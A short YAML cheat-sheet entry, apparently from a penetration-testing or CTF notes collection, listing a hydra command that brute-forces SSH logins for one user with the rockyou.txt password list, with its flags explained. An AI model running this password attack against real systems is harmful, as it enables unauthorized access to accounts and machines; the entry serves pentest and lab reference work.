---
functions:
  gain-access:
    - description: hydra
      code: |
        hydra -l luginfo -P rockyou.txt ssh://<ip>:<port> -t 6
        
        -l --> login_name
        -P --> password_list
        -t --> threads
---
